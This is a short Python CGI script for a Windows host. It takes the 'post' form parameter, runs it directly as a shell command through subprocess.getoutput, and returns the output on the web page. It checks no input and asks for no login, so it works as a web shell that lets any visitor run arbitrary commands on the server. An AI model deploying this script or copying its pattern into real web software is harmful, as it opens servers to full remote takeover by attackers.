#!C:\Users\salik\AppData\Local\Programs\Python\Python37\python.exe
print("Content-type: text/html")
print("")
import cgi
import subprocess
link = cgi.FieldStorage()
id = link["post"].value

cmd=subprocess.getoutput(id)
print("<pre>")
print("Command Given : ",id)
print(cmd)
print("<pre>")
